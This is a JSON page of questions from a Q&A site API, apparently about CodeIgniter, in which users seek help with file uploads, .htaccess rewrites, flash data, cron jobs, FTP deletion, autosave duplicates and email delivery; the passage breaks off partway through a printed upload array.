{"total":13987,"page":19,"pagesize":100,"questions":[{"tags":["php","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":101,"score":3,"question_id":12337132,"title":"Codeigniter do_upload doesn't response in production server","body":"<p>for the past hour I've been cracking up to solve this problem. I'm quite new to Codeigniter.</p>\n\n<p>I made a page that will upload certain file types.\nIt works fine in my local development but not in production.\nIt won't pass the do_upload() function. Nothing is displayed beyond that.</p>\n\n<pre><code>$path = 'uploads';\necho 'path: '. $path .' &lt;br&gt;'; \n\n//-- config for uplaod --\n$configUpdload['upload_path']   = $path ;\n$configUpdload['allowed_types'] = 'gif|jpg|png|xls|xlsx|pdf';\n$configUpdload['max_size']   = '4000'; //size in kilobytes\n$configUpdload['encrypt_name']  = TRUE;\n\n//-- load upload library --\n$this-&gt;load-&gt;library('upload');\n\n$this-&gt;upload-&gt;initialize($configUpdload);\n\nif ($_FILES['fileref']['name']!=\"\")\n{\n    ini_set('display_errors', true);\n    error_reporting(E_ALL);\n\n    echo 'uploadAttachment&lt;br&gt;';\n\n    $uploaded = $this-&gt;upload-&gt;do_upload(\"fileref\");\n\n    echo 'uploaded: '. $uploaded . '&lt;br&gt;';\n\n    if ($uploaded == true)\n    {\n        echo 'uploaded data&lt;br&gt;';\n        $inputUp = $this-&gt;upload-&gt;data();\n        echo 'data: '. print_r($inputUp,true) . '&lt;br&gt;'; \n        $uploadInput['orig_name']   = $inputUp['orig_name'];\n        $uploadInput['enc_name']    = $inputUp['file_name'];\n        $uploadInput['extension']   = $inputUp['file_ext'];\n\n        echo 'uploaded true&lt;br&gt;';\n    }else{\n        die($this-&gt;upload-&gt;display_errors());\n    }\n}\n</code></pre>\n\n<p>I tried changing the upload_path to non existing folder, it show 'The upload path does not appear to be valid'. Means the do_upload() does work right?</p>\n\n<p>The uploads folder permission is 777.</p>\n\n<p>I also tried using absolute path but still doesnt show anything pass do_upload().</p>\n\n<p>Or anything to do with the server?</p>\n\n<p>Does anyone knows what is happening? Help much appreciated.</p>\n\n<p>Thanks.</p>\n\n<p>[edit1]</p>\n\n<p>Nothing in the server's error log nor normal log. I also set $config['log_threshold'] = 4; No error log.</p>\n\n<p>[edit2]</p>\n\n<p>Production server is 3rd party web hosting under linux. I tried php_info() and trace anything to do with upload.    </p>\n\n<pre><code>file_uploads        On  On  \nmax_file_uploads    20  20  \npload_max_filesize  30M 30M  \nupload_tmp_dir      /tmp/   /tmp/  \nsuhosin.upload.disallow_binary  0   0  \nsuhosin.upload.disallow_elf 1   1  \nsuhosin.upload.max_uploads  25  25  \nsuhosin.upload.remove_binary    0   0  \nsuhosin.upload.verification_script  no value  \n</code></pre>\n\n<p>  \nI also tried decrease the filesize $configUpdload['max_size']   = '10'; but no message after do_upload() still.</p>\n\n<p>[Edit3]\nMy folder structure:</p>\n\n<pre><code>public_html/gtapp/\npublic_html/gtapp/csystem/ &lt;- is system folder\npublic_html/gtapp/v1/ &lt;- is application folder\npublic_html/gtapp/media/\npublic_html/gtapp/uploads/\npublic_html/gtapp/license.txt\n</code></pre>\n\n<p>In config.php:</p>\n\n<pre><code>$config['base_url'] = 'http://www.mydomain.com/gtapp/\n</code></pre>\n\n<p>In index.php:</p>\n\n<pre><code>$application_folder = 'v1';\n</code></pre>\n\n<p>when I do <code>APPPATH . 'uploads';</code> to above code is shows: </p>\n\n<pre><code>uploadAttachment\npath: v1/uploads\nuploaded: \nThe upload path does not appear to be valid.\n</code></pre>\n\n<p>I tried <code>$path = $_SERVER['DOCUMENT_ROOT'] . '/gtapp/uploads';</code> \nIt just shows:</p>\n\n<pre><code>uploadAttachment\npath: /home/user/domains/mydomain.com/public_html/gtapp/uploads \n</code></pre>\n\n<p>Sorry I know this is very basic. Bare with me please :)</p>\n\n<p>[Edit4]</p>\n\n<p>I made a crude version of native PHP upload codes and it works. I dont think it is a server issue. Below is the code:</p>\n\n<pre><code>$name = 'fileref'; \n\n$upload_path    = './uploads/';\n$allowed_types  = array(\"jpg\", \"jpeg\", \"gif\", \"png\", \"xls\", \"xlsx\", \"pdf\");\n$extension      = end(explode(\".\", $_FILES[$name][\"name\"]));\n$max_size       = '4000';\n\nif ($_FILES['fileref']['name']!=\"\")\n{\n    if ((($_FILES[$name][\"type\"] == \"image/gif\")\n        || ($_FILES[$name][\"type\"] == \"image/jpeg\")\n        || ($_FILES[$name][\"type\"] == \"image/pjpeg\")\n        || ($_FILES[$name][\"type\"] == \"image/png\")\n        || ($_FILES[$name][\"type\"] == \"image/x-png\")\n        || ($_FILES[$name][\"type\"] == \"application/excel\")\n        || ($_FILES[$name][\"type\"] == \"application/vnd.ms-excel\")\n        || ($_FILES[$name][\"type\"] == \"application/msexcel\")\n        || ($_FILES[$name][\"type\"] == \"application/pdf\")\n        || ($_FILES[$name][\"type\"] == \"application/x-download\"))\n        &amp;&amp; (round($_FILES[$name][\"size\"]/1024,2) &lt; $max_size )\n        &amp;&amp; in_array($extension, $allowed_types))\n        {\n\n            if ($_FILES[$name][\"error\"] &gt; 0)\n            {\n                echo $_FILES[$name][\"error\"]);\n            }\n            else\n            {\n                $uploadInput['orig_name']   = $_FILES[$name][\"name\"];\n                $uploadInput['enc_name']    = sha1($_FILES[$name][\"name\"]);\n                $uploadInput['extension']   = $_FILES[$name][\"type\"];\n\n                $moved = move_uploaded_file($_FILES[$name][\"tmp_name\"], $upload_path . $uploadInput['enc_name'] . '.' . $extension);\n\n                if($moved)\n                    echo 'success';\n                else\n                    echo 'fail';\n\n            }\n        }\n}\n</code></pre>\n"},{"tags":["php","codeigniter","session","post"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12353370,"title":"Code Igniter Flash Data","body":"<p>I'm struggling with Flash Data in CodeIgniter.</p>\n\n<p>I basically want to:</p>\n\n<p>add a category to a database\nredirect user back to a page\nshow a success pop-up message \"Your category has been created\"</p>\n\n<p>So far I can add the category successfully to the db and the user input is validated correctly, only thing is I don't know how to create the pop up success message. (I don't want to load a success view), just redirect back to where they came from and show small message in the top corner or something.</p>\n\n<p>Is flash data the right way to go?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12354169,"title":"url shows twice when submit","body":"<p>using codeigniter for the first time now, and trying out the upload file class they describe <a href=\"http://codeigniter.com/user_guide/libraries/file_uploading.html\" rel=\"nofollow\">here</a>. Now what happens is strange because once I submit the form with image selected, it displays error 404 which is understandable given for some reason the url shown in address bar turns out to be: </p>\n\n<blockquote>\n  <p><a href=\"http://mydomain.com/index.php/www.mydomain.com/index.php/do_upload\" rel=\"nofollow\">http://mydomain.com/index.php/www.mydomain.com/index.php/do_upload</a></p>\n</blockquote>\n\n<p>so it is repeating! that is causing the problem of 404 but i have no idea why it is happening?</p>\n\n<p>the code am using for controller is:</p>\n\n<pre><code>&lt;?php\n\nclass Upload extends CI_Controller {\n\n    function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;helper(array('form', 'url'));\n        //form_upload('userfile'); \n    }\n\n    function index()\n    {\n        $this-&gt;load-&gt;view('upload_form', array('error' =&gt; ' ' ));\n    }\n\n    function do_upload()\n    {\n        $config['upload_path'] = '/uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size'] = '100';\n        $config['max_width']  = '1024';\n        $config['max_height']  = '768';\n\n        $this-&gt;load-&gt;library('upload', $config);\n\n        if ( ! $this-&gt;upload-&gt;do_upload())\n        {\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n            $this-&gt;load-&gt;view('upload_form', $error);\n        }\n        else\n        {\n            $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n            $this-&gt;load-&gt;view('upload_success', $data);\n        }\n    }\n}\n?&gt;\n</code></pre>\n\n<p>Appreciate the support :)</p>\n\n<p>EDIT: submit form:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Upload Form&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;?php echo $error;?&gt;\n\n&lt;?php echo form_open_multipart('upload/do_upload');?&gt;\n\n&lt;input type=\"file\" name=\"userfile\" size=\"20\" /&gt;\n\n&lt;br /&gt;&lt;br /&gt;\n\n&lt;input type=\"submit\" value=\"upload\" /&gt;\n\n&lt;/form&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":222,"score":1,"question_id":4028192,"title":"does codeigniter have a supported openid library or plugin?","body":"<p>I have a project with CodeIgniter that requires openId - the janrain libraries seem overkill. Anything simpler or specific to CI?</p>\n"},{"tags":["codeigniter","mod-rewrite","localhost","mamp"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":117,"score":2,"question_id":12332836,"title":"localhost directs to www.domains.tld after adding .htaccess in codeigniter folder","body":"<p>I just started using Codeigniter to develop a simple static website using a local server (MAMP). Initially my local address to access my homepage was <code>http://localhost/index.php/home</code>. Even a simple localhost would redirect to my homepage. I wanted to remove the 'index.php' from the URL and hence I copy pasted the .htaccess code which I found online. The code looked like the following:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n    RewriteEngine On\n    RewriteBase /\n\n    ### Canonicalize codeigniter URLs\n\n    # If your default controller is something other than\n    # \"welcome\" you should probably change this\n    RewriteRule ^(welcome(/index)?|index(\\.php)?)/?$ / [L,R=301]\n    RewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n    # Removes trailing slashes (prevents SEO duplicate content issues)\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.+)/$ $1 [L,R=301]\n\n    # Enforce www\n    # If you have subdomains, you can add them to \n    # the list using the \"|\" (OR) regex operator\n    #RewriteCond %{HTTP_HOST} !^(www|subdomain) [NC]\n    #RewriteRule ^(.*)$ http://www.domain.tld/$1 [L,R=301]\n\n    # Enforce NO www\n    RewriteCond %{HTTP_HOST} ^www [NC]\n    RewriteRule ^(.*)$ http://localhost/$1 [L,R=301]\n\n    ###\n\n    # Removes access to the system folder by users.\n    # Additionally this will allow you to create a System.php controller,\n    # previously this would not have been possible.\n    # 'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php/$1 [L]\n\n    # Checks to see if the user is attempting to access a valid file,\n    # such as an image or css document, if this isn't true it sends the\n    # request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php/$1 [L]\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n    # Without mod_rewrite, route 404's to the front controller\n    ErrorDocument 404 /index.php\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Initially I copy-pasted the code without changing it at all (which was foolish on my part) So the 'localhost' in the code above was initially 'www.domains.tld'. When I then ran localhost on my browser, it directed to www.domains.tld'. I noticed the blunder and changed it to what it is above and localhost still directs to 'www.domains.tld' I deleted the .htaccess file to reverse the effect but it still does the same thing.\nI also changed my root folder for localhost but whatever I do localhost points to 'domains.tld'. When I type 127.0.0.1 on the address bar of my browser, it directs correctly to my website. I have spent hours reading up on the reason for this behavior but am unsuccessful to find a solution.</p>\n\n<p>Any help will be greatly appreciated.</p>\n\n<p>Thanks,\nH.</p>\n"},{"tags":["codeigniter","cron"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":603,"score":0,"question_id":6200828,"title":"Issues with Codeignitor and Cron Bootstrapper","body":"<p>I am trying to create a cron job while taking advantage of my current CI setup and the use of Controllers and Models. I am using Cron Bootstrapper (http://codeigniter.com/wiki/Cron_job_bootstrapper/) because it gives me easy access to test the process locally on-demand or be available as a traditional cron process on a server. I can reach the controller using the bootstrapper file and the command line, however, I am getting many different error messages or alerts depending on how I set up my controller.</p>\n\n<p>If I keep the controller as it should be with <code>parent::Controller();</code>, I get the following message:</p>\n\n<blockquote>\n  <p>Unable to connect to your database server using the provided settings.</p>\n</blockquote>\n\n<p>The error is coming from the DB_driver.php <code>initialize()</code> method.</p>\n\n<p>If I remove the call to <code>parent::Controller()</code> from the controller then I get the following alert:</p>\n\n<pre><code>    &lt;p&gt;Severity: Warning&lt;/p&gt;\n    &lt;p&gt;Message:  date(): It is not safe to rely on the system's timezone settings. You\n       are *required* to use the date.timezone setting or the\n       date_default_timezone_set() function. In case you used any of those\n       methods and you are still getting this warning, you most likely misspelled\n       the timezone identifier. We selected 'America/New_York' for\n       'EDT/-4.0/DST' instead&lt;/p&gt;\n    &lt;p&gt;Filename: htdocs/cron.php&lt;/p&gt;\n    &lt;p&gt;Line Number: 122&lt;/p&gt;`\n</code></pre>\n\n<p>By removing the <code>parent::Controller();</code> I am not able to access any models via <code>$this-&gt;load-&gt;model('model');</code> and I get the following message:</p>\n\n<blockquote>\n  <p>Fatal error: Call to a member function model() on a non-object in /Applications/MAMP/htdocs/my_site/system/application/controllers/cron.php on line 9</p>\n</blockquote>\n\n<p>Any info that will allow me to use the bootstrapper file with CI will be very helpful.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":306,"score":1,"question_id":7998146,"title":"CodeIgniter Authentication Library 2011","body":"<p>I am looking for a flexible, easy customized, Userlevel access and secure Authentication library that I can quickly get started with.</p>\n\n<p>I was looking at Stackoverflow and read about a few Authentication libraries but these posts were posted in 2010.</p>\n\n<p>What Authentication library out there should I use? Why?</p>\n"},{"tags":["php","codeigniter","ftp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12351700,"title":"Recursively deleting folder in CodeIgniter FTP Class","body":"<p>I am using the CI FTP class, with the function delete_dir, its supposed to delete the folder and everything side of it, however, if the folder has files in it, it won't delete the folder and outputs an error.</p>\n\n<p>The function is as follows;</p>\n\n<pre><code>function delete_dir($filepath)\n{\n    if ( ! $this-&gt;_is_conn())\n    {\n        return FALSE;\n    }\n\n    // Add a trailing slash to the file path if needed\n    $filepath = preg_replace(\"/(.+?)\\/*$/\", \"\\\\1/\",  $filepath);\n\n    $list = $this-&gt;list_files($filepath);\n\n    if ($list !== FALSE AND count($list) &gt; 0)\n    {\n        foreach ($list as $item)\n        {\n            // If we can't delete the item it's probaly a folder so\n            // we'll recursively call delete_dir()\n            if ( ! @ftp_delete($this-&gt;conn_id, $item))\n            {\n                $this-&gt;delete_dir($item);\n            }\n        }\n    }\n</code></pre>\n\n<p>Anyone know of any bugs?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12225321,"title":"How to add Ion Auth Login form in sidebar?","body":"<p>I have a blog application that I want a login form in a sidebar. I use Ion Auth library. How do I do that?</p>\n\n<p>I have this in my sidebar view:</p>\n\n<pre><code>&lt;?php echo form_open(\"blog/login\");?&gt;\n\n  &lt;p&gt;\n    &lt;input type=\"text\" name=\"identity\"&gt;Username:&lt;/&gt;         \n  &lt;/p&gt;      \n  &lt;p&gt;\n    &lt;input type=\"text\" name=\"password\"&gt;Password:&lt;/&gt;      \n  &lt;/p&gt;      \n  &lt;p&gt;\n   &lt;label for=\"remember\"&gt;Remember Me:&lt;/label&gt;\n      &lt;?php echo form_checkbox('remember', '1', FALSE, 'id=\"remember\"');?&gt;\n &lt;/p&gt;\n  &lt;p&gt;&lt;?php echo form_submit('submit', 'Login');?&gt;&lt;/p&gt;      \n&lt;?php echo form_close();?&gt;\n</code></pre>\n\n<p>But when I click \"Login\" it goes to different page. I want login function in my blog controller to work behind and staying in home page. </p>\n\n<p>Thanks in advance guys!</p>\n"},{"tags":["php","sql","codeigniter","autosave"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12351264,"title":"Repeating same data in sql on autosave","body":"<p>i am trying to auto save some data after a certain time in a database.here is my view code</p>\n\n<pre><code>&lt;div id=\"main\"&gt;\n  &lt;?php echo validation_errors(); ?&gt;\n  &lt;h1&gt;Purchase Product Detail&lt;/h1&gt;\n\n\n  &lt;?php\n  echo form_open( 'shop/buy_product/submit' );\n  ?&gt;\n  &lt;?php echo validation_errors(); ?&gt;\n  &lt;table&gt;\n    &lt;tr&gt;\n      &lt;td&gt;\n        Shop Name\n      &lt;/td&gt;\n      &lt;td&gt;\n\n&lt;?php\necho form_dropdown( 'shop', $tags );\n\n\n//echo form_dropdown('shop', $options, 'Yellow');\n?&gt;\n      &lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;th&gt;\n        SL.\n      &lt;/th&gt;\n      &lt;th&gt;\n        Product code\n      &lt;/th&gt;\n      &lt;th&gt;\n        Product Name\n      &lt;/th&gt;\n\n      &lt;th&gt;\n        Rate\n      &lt;/th&gt;\n      &lt;th&gt;\n        Quantity\n      &lt;/th&gt;\n      &lt;th&gt;\n        Total\n      &lt;/th&gt;\n      &lt;th&gt;\n        Sell Price\n      &lt;/th&gt;\n\n    &lt;/tr&gt;\n&lt;?php for ( $i = 1; $i &lt;= 10; $i++ ): ?&gt;\n      &lt;tr&gt;\n        &lt;td width=\"10\"&gt;\n  &lt;?php echo $i; ?&gt;\n        &lt;/td&gt;\n\n        &lt;td&gt;\n          &lt;input size=\"10\" type=\"text\" name=\"code[]\" value=\"&lt;?php echo ''; ?&gt;\" id=\"code_&lt;?php echo $i; ?&gt;\" /&gt;\n        &lt;/td&gt;\n        &lt;td width=\"20%\"&gt;\n      &lt;name=\"product[]\" value=\"&lt;?php echo ''; ?&gt;\" id=\"product_&lt;?php echo $i; ?&gt;\"/&gt;\n      &lt;/td&gt;\n      &lt;td&gt;\n        &lt;input size=\"10\"type=\"text\" name=\"rate[]\" value=\"&lt;?php echo ''; ?&gt;\" id=\"rate_&lt;?php echo $i; ?&gt;\" /&gt;\n      &lt;/td&gt;\n      &lt;td&gt;\n        &lt;input size=\"10\" type=\"text\" name=\"quantity[]\" value=\"&lt;?php echo ''; ?&gt;\" id=\"quantity_&lt;?php echo $i; ?&gt;\" /&gt;\n      &lt;/td&gt;\n      &lt;td width=\"15%\"&gt;\n      &lt;name=\"total[]\" value=\"&lt;?php echo ''; ?&gt;\" id=\"total_&lt;?php echo $i; ?&gt;\"/&gt;\n      &lt;/td&gt;\n      &lt;td&gt;\n        &lt;input size=\"10\" type=\"text\" name=\"sell[]\" value=\"&lt;?php echo ''; ?&gt;\" id=\"sell\" /&gt;\n      &lt;/td&gt;\n\n      &lt;/tr&gt;\n&lt;?php endfor; ?&gt;\n\n\n\n\n\n\n\n  &lt;/table&gt;\n  &lt;input type=\"submit\" value=\"Submit\"/&gt;\n&lt;?php echo form_close(); ?&gt;\n\n\n\n&lt;/div&gt;\n</code></pre>\n\n<p>and here is my model </p>\n\n<pre><code>    function add_product()\n\n        {\n            $data  = array();\n                $todayDate = date('Y-m-d');\n                for($i = 0; $i &lt; count($_POST['code']); $i++){\n                    if($_POST['code'][$i] != '')\n                    {\n                        $data[] = array(\n                            'code' =&gt; $_POST['code'][$i],\n                            'shop' =&gt; $_POST['shop'],\n                            'memo' =&gt; $_POST['memo'],\n                            'rate' =&gt; $_POST['rate'][$i],\n                            'quantity' =&gt; $_POST['quantity'][$i],\n                            'total' =&gt;( $_POST['rate'][$i]*$_POST['quantity'][$i]),\n                            'date' =&gt; $todayDate\n                            );\n                    }\n                }\n                $linksCount = count($data);\n\n                if($linksCount){\n                    $this-&gt;db-&gt;insert_batch('purchase', $data);\n                }\n\n                return $linksCount;\n\n        }\n</code></pre>\n\n<p>my main problem is when the auto save function executed it insert all the data in the database. its repeating the same data again and again after a certain.can anyone help me fixing this.</p>\n"},{"tags":["php","mysql","arrays","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":98,"score":2,"question_id":12334425,"title":"pass array from controller to view in codeigniter","body":"<p>Model:</p>\n\n<p>Grabs data from mySQL with the value: <code>array['10','5','2']</code> and puts it in the session data</p>\n\n<p>Controller:</p>\n\n<p>Puts that session data into an array to pass to the view:</p>\n\n<pre><code>$fubar = array(\n'ex1' =&gt; $this-&gt;session-&gt;userdata('ex1')\n    );\n$this-&gt;load-&gt;view('view', $fubar);\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>echo $ex1;\n</code></pre>\n\n<p>The view will spit out the array: <code>array['10','5','2']</code>\nHow do I parse that array to get the individual values (10, 5, or 2)?\nFor example, <code>echo $ex1['1'];</code> will spit out the first 1 characters: <code>ar</code> but I want it to return the value <code>5</code></p>\n\n<p>I think perhaps I may not be storing the array properly in mySQL, but I'm not sure.</p>\n"},{"tags":["php","mvc","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":105,"score":2,"question_id":12350195,"title":"MVC - Does this code belong to model, controller or view?","body":"<p>I have in my site notifications, similar as facebook. But I only have 3 type of notifications:</p>\n\n<ul>\n<li>[nickname] sent you a new quize [quizename]</li>\n<li>[nickname] added you to his group [groupname]. accept | deny</li>\n<li>You received 100$ credit for login today.</li>\n</ul>\n\n<p>Table notification</p>\n\n<p>notification_id | type | item_id | from_id | to_id | created | notified</p>\n\n<p>item_id represents quize_id or group_id. I make extra joins to get all data.</p>\n\n<p>A problem I have is how to display each notification depends on type. One of options is to organize string for display in controller:</p>\n\n<pre><code>foreach($results as $key =&gt; $result){\n  switch($result['type']){\n    case 1:\n    $string = \"&lt;a href=\".baseUrl().\"/users/$result['userId']&gt;$result['nickname']&lt;/a&gt; \"._(\"wants you to take a quize\").\" &lt;a href='\".baseUrl().\"/quize/$result['rel']'&gt;$result['quizeName']&lt;/a&gt;\";\n    break;\n    case 2:\n    $string = \"&lt;a href=\".baseUrl().\"/users/$result['userId']&gt;$result['nickname']&lt;/a&gt; \"._(\"added you to his group\").\" &lt;a href='\".baseUrl().\"/group/$result['rel']'&gt;$result['groupName']&lt;/a&gt;\";\n    break;\n    case 3:\n    $string = _(\"You received 100 credit for log in today\");\n  }\n  $notifications[$key]['string'] = $string;\n}\n\n$data['notifications'] = $notifications;\n\n$this-&gt;load-&gt;view('views/notifications/last_notification_view', $data);\n</code></pre>\n\n<p>The problem with that method is that part of view is inside controller. I could sent rough data to view, but then the problem is that I need to make similar php code in view. So which method is better? Or is there any other way?</p>\n"},{"tags":["php","codeigniter","email"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":195,"score":0,"question_id":11843123,"title":"sending emails with codeigniter recieved in junk mail","body":"<p>am trying to send emails using codeigniter email library to send emails to users using the following settings</p>\n\n<pre><code>  $this-&gt;load-&gt;library('email');\n        $this-&gt;email-&gt;from('email@domain.com','Admin');\n        $this-&gt;email-&gt;to($recieverEmail);\n        $this-&gt;email-&gt;subject('Morgan MarketBook');\n        $this-&gt;email-&gt;message($message);\n\n\n   &lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\n   $config['protocol']   = 'smtp';\n   $config['smtp_host']  = 'mail.server';\n   $config['smtp_port']  = 26 ;\n   $config['smtp_user']  = 'user' ;\n   $config['smtp_pass']  = 'password' ;\n   $config['newline']    = \"\\r\\n\";\n\n   ?&gt;\n</code></pre>\n\n<p>my problem that the recieved emails are in the junk mail and not in the inbox...what is causing this problem ?</p>\n"},{"tags":["php","codeigniter","file-upload","for-loop","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":233,"score":3,"question_id":12301042,"title":"For loop not giving the expected repetitions","body":"<p>I have a function in my site that uploads images from the $_FILES array. This function works fine for if you only have a single image, and two or less items in the array, but it can only upload 2 images. For example, my form allows for a maximum of 17 images in the pei_name[] fields but it only uploads the first 2 fields. Here is the function:</p>\n\n<pre><code>private function productImageUploader($id, $image, $altText, $uploadDir)\n{\n\n    $uploadDir = (!substr($uploadDir, \"/\")) ? $uploadDir.\"/\" : $uploadDir;\n    $image = $_FILES[$image];\n\n    if(is_array($image['name']))\n    {\n    print_r($_FILES);\n        for($i=0; $i&lt;=sizeof($image['name']); ++$i)\n        {\n            echo $i;\n            if($image['error'][$i] != 4)\n            {\n\n                $image['name'][$i] = str_replace(\" \", \"-\", $image['name'][$i]);\n\n                $targetPath = $uploadDir.basename($image['name'][$i]);\n\n                if(!move_uploaded_file($image['tmp_name'][$i], $targetPath))\n                {\n\n                    switch($image['error'][$i])\n                    {\n\n                        case 1:\n                            return \"&lt;p class=\\\"error\\\"&gt;The file for Extra Image {$i} is too large for the server.&lt;/p&gt;\";\n                            break;\n\n                        case 2:\n                            return \"&lt;p class=\\\"error\\\"&gt;The file for Extra Image {$i} is too large for the form.&lt;/p&gt;\";\n                            break;\n\n                        case 3:                             \n                        case 6:\n                        case 7:\n                            return \"&lt;p class=\\\"error\\\"&gt;An error occured uploading Extra Image {$i}. Please &lt;a onclick=\\\"location.reload(true);\\\"&gt;refresh&lt;/a&gt; the page.&lt;/p&gt;\";\n                            break;  \n\n                        case 8:\n                            return \"&lt;p class=\\\"error\\\"&gt;The file for Extra Image {$i} is not the correct file type. Please convert it to either a jpg, .png or .bmp file.&lt;/p&gt;\";\n                            break;\n\n                    }\n\n                }\n                else\n                {\n\n                    $thisAlt = (isset($_POST[$altText][$i]) &amp;&amp; $_POST[$altText][$i] != \"\") ? $_POST[$altText][$i] : $_POST['prod_title'];\n\n                    $data = array (\n                        'pei_product_id' =&gt; $id,\n                        'pei_location' =&gt; $image['name'][$i],\n                        'pei_alt' =&gt; $thisAlt\n                    );\n\n                    if(!isset($_POST[\"pei_id\"][$i]))\n                    {\n\n                        $this-&gt;db-&gt;insert(\"product_extra_images\", $data);\n\n                    }\n                    else\n                    {\n\n                        $this-&gt;db-&gt;where(\"pei_id\", $_POST['pei_id'][$i]);\n                        $this-&gt;db-&gt;update(\"product_extra_images\", $data);\n\n                    }\n\n                    return true;\n\n                }\n\n            }\n\n        }\n\n    }\n    else\n    {\n\n        if($image['error'] != 4)\n        {\n\n            $image['name'] = str_replace(\" \", \"-\", $image['name']);\n\n            $targetPath = $uploadDir.basename($image['name']);\n\n            if(!move_uploaded_file($image['tmp_name'], $targetPath))\n            {\n\n                switch($image['error'])\n                {\n\n                    case 1:\n                        return \"&lt;p class=\\\"error\\\"&gt;The file for the main product image is too large for the server.&lt;/p&gt;\";\n                        break;\n\n                    case 2:\n                        return \"&lt;p class=\\\"error\\\"&gt;The file for the main product image is too large for the form.&lt;/p&gt;\";\n                        break;\n\n                    case 3:                             \n                    case 6:\n                    case 7:\n                        return \"&lt;p class=\\\"error\\\"&gt;An error occured uploading the main product image. Please &lt;a onclick=\\\"location.reload(true);\\\"&gt;refresh the page.&lt;/p&gt;\";\n                        break;  \n\n                    case 8:\n                        return \"&lt;p class=\\\"error\\\"&gt;The file for the main product image is not the correct file type. Please convert it to either a jpg, .png or .bmp file.&lt;/p&gt;\";\n                        break;\n\n                }\n\n            }\n            else\n            {\n\n                $data = array ('prod_main_image' =&gt; $image['name']);\n\n                $this-&gt;db-&gt;where(\"prod_id\", $id);\n                $this-&gt;db-&gt;update(\"products\", $data);\n\n                return true;\n\n            }\n\n        }\n\n    }\n\n    if(isset($_POST[\"pei_id\"]) &amp;&amp; is_array($_POST[\"pei_id\"]))\n    {\n\n        for($i=0; $i&lt;sizeof($_POST[\"pei_id\"]); ++$i)\n        {\n\n            $thisAlt = (isset($_POST[$altText][$i]) &amp;&amp; $_POST[$altText][$i] != \"\") ? $_POST[$altText][$i] : $_POST['prod_title'];\n            $this-&gt;db-&gt;where(\"pei_id\", $_POST[\"pei_id\"][$i]);\n            $this-&gt;db-&gt;update(\"product_extra_images\", array(\"pei_alt\"=&gt; $thisAlt));\n        }\n\n    }\n\n    return true;\n\n}\n</code></pre>\n\n<p>Here is the contents of the $_FILES array:</p>\n\n<pre><code>Array\n(\n[prod_main_image] =&gt; Array\n    (\n        [name] =&gt; \n        [type] =&gt; \n        [tmp_name] =&gt; \n        [error] =&gt; 4\n        [size] =&gt; 0\n    )\n\n[pei_image] =&gt; Array\n    (\n        [name] =&gt; Array\n            (\n                [0] =&gt; Untitled.jpg\n                [1] =&gt; Untitled.jpg\n                [2] =&gt; Untitled.jpg\n                [3] =&gt; Untitled.jpg\n                [4] =&gt; Untitled.jpg\n                [5] =&gt; Untitled.jpg\n                [6] =&gt; Untitled.jpg\n                [7] =&gt; Untitled.jpg\n                [8] =&gt; Untitled.jpg\n                [9] =&gt; Untitled.jpg\n                [10] =&gt; Untitled.jpg\n                [11] =&gt; Untitled.jpg\n                [12] =&gt; Untitled.jpg\n                [13] =&gt; Untitled.jpg\n                [14] =&gt; Untitled.jpg\n                [15] =&gt; Untitled.jpg\n                [16] =&gt; Untitled.jpg\n            )\n\n        [type] =&gt; Array\n            (\n                [0] =&gt; image/jpeg\n                [1] =&gt; image/jpeg\n                [2] =&gt; image/jpeg\n                [3] =&gt; image/jpeg\n                [4] =&gt; image/jpeg\n                [5] =&gt; image/jpeg\n                [6] =&gt; image/jpeg\n                [7] =&gt; image/jpeg\n                [8] =&gt; image/jpeg\n                [9] =&gt; image/jpeg\n                [10] =&gt; image/jpeg\n                [11] =&gt; image/jpeg\n                [12] =&gt; image/jpeg\n                [13] =&gt; image/jpeg\n                [14] =&gt; image/jpeg\n                [15] =&gt; image/jpeg\n                [16] =&gt; image/jpeg\n            )\n\n        [tmp_name] =&gt; Array\n            (\n                [0] =&gt; /tmp/phpGgDKqk\n                